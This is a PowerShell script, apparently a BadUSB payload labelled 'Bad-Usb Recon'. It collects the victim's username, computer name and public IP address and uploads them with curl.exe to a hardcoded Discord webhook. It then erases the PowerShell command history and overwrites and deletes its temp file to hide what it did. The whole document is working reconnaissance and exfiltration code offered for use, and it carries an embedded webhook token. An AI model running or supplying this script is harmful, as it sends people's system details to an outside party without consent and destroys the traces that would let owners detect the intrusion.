$webhookUrl = "https://discordapp.com/api/webhooks/1360981550174441498/cxv3RG3NDt_eRobBKo7STK3C-mmx76IS5T8QJ07qZnspV749ZRZ0uLVRGBzzsq_2Rh3v"

$username = $env:USERNAME
$computername = $env:COMPUTERNAME
$ip_adress = Invoke-RestMethod -Uri "https://api.ipify.org"
$output = "Username: $username nComputername: $computernamenIPadress: $ip_adress"
$path = "$env:TEMP\recon.txt"

$output | Out-File $path

$body = @{
    "content" = "Bad-Usb Recon: "
} | ConvertTo-Json

$form = @{
    "file1" = Get-Item -LiteralPath $path
    "payload_json" = $body
}

# Upload file using curl
curl.exe -F "file1=@$path" $webhookUrl

Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

Set-Content -Path $path -Value ('x' * 10000)       # Overwrites file with 10,000 x's
Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
